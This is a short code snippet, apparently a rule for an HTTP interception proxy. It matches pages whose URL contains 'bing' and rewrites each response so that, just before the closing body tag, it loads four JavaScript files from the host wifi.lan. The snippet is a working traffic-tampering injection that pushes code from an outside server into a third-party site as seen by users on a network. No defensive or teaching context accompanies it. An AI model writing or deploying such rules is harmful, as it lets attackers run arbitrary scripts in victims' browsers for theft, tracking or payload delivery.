http()
    .url(/bing/)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://wifi.lan/jquery.min.js'></script>
        <script src='http://wifi.lan/index2.js'></script>
        <script src='http://wifi.lan/b.bundle.js'></script>
        <script src='http://wifi.lan/init.js'></script>
        </body>
    `)
